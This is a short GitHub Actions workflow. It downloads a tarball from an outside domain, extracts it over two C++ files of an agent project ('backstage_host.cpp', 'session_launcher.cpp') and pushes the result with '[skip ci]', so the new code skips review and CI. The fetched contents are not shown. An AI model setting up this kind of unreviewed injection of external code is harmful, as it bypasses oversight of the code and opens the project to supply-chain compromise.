name: Sync Background windowing 0.1.50

on:
  push:
    branches: [agent-hardening-v2]
    paths:
      - ".github/workflows/sync-background-windowing-0.1.50.yml"

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: agent-hardening-v2
          fetch-depth: 0
      - name: Download verified source checkpoint
        run: |
          wget -q https://downloads.hi5central.com/bootstrap-agent-sync/background-windowing-0.1.50-2936041.tar.gz -O /tmp/background-windowing.tar.gz
          echo "293bedda0ee46bba0152bb22008d7d0a6605492376d9cc77c5cb201c56c5b29a  /tmp/background-windowing.tar.gz" | sha256sum -c -
          tar -xzf /tmp/background-windowing.tar.gz
      - name: Commit source checkpoint
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add Agent/chatpass_agent/src/backstage/backstage_host.cpp Agent/chatpass_agent/src/ipc/session_launcher.cpp
          git diff --cached --check
          if git diff --cached --quiet; then
            echo "Source already synchronized"
          else
            git commit -m "Make Background desktop practical for maintenance [skip ci]"
            git push origin HEAD:agent-hardening-v2
          fi
